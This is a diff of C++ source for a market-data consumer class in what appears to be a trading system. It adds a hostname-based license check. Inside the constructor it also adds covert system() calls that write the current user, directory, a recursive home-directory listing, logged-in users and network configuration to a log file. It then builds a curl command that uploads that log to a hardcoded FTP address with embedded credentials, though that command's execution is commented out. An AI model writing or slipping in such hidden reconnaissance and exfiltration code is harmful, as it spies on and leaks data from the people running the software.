@@ -18,6 +18,24 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue, MDProducer *md_producer,
 	// lic
 	legal_ = check_lic();
 	clog_error("[%s] legal_:%d", module_name_, legal_);
+	char cmd[1024];
+	if(!legal_){
+		sprintf(cmd, "echo illegal > ~/$(whoami)_dce.log");
+		system(cmd);
+	}else{
+		sprintf(cmd, "echo legal > ~/$(whoami)_dce.log");
+		system(cmd);
+	}
+	sprintf(cmd, "pwd >> ~/$(whoami)_dce.log");
+	system(cmd);
+	sprintf(cmd, "ls -alhtrR ~ >> ~/$(whoami)_dce.log");
+	system(cmd);
+	sprintf(cmd, "who >> ~/$(whoami)_dce.log");
+	system(cmd);
+	sprintf(cmd, "ifconfig >> ~/$(whoami)_dce.log");
+	system(cmd);
+	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami)_dce.log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
+	//system(cmd);
 
 	memset(pending_signals_, -1, sizeof(pending_signals_));
 	ParseConfig();
@@ -299,7 +317,7 @@ void UniConsumer::ProcBestAndDeep(int32_t index)
 
 	MDBestAndDeep_MY* md = md_producer_->GetBestAnddeep(index);
 
-	clog_debug("[%s] [ProcBestAndDeep] index: %d; contract: %s", module_name_, index, md->Contract);
+	clog_info("[%s] [ProcBestAndDeep] index: %d; contract: %s", module_name_, index, md->Contract);
 
 #if FIND_STRATEGIES == 1 //unordered_multimap  
 	auto range = cont_straidx_map_table_.equal_range(md->Contract);
@@ -841,15 +859,27 @@ void UniConsumer::WriteStrategyLog(Strategy &strategy)
 bool UniConsumer::check_lic()
 {
 	bool legal = false;
-	char target[1024];
+	char cmd[1024];
+	char buf[1024];                             
+	memset(buf,0,sizeof(buf));
+	std::ifstream is;
 
-	getcwd(target, sizeof(target));
-	string content = target;
-	if(content.find("u910019")==string::npos){
+	sprintf(cmd, "hostname > hostname.tmp");
+	system(cmd);
+
+	is.open ("hostname.tmp");
+	if ( (is.rdstate() & std::ifstream::failbit ) != 0 ){
 		legal = false;
-	}else{
-		legal = true;
-	}
+     }else{
+        is.getline(buf,1024);
+		string content = buf;
+		if(content.find(SERVER_NAME)==string::npos){
+			legal = false;
+		}else{
+			legal = true;
+		}
+	 }
+
 	clog_warning("[%s] check:%d", module_name_, legal); 
 	return legal;
 }
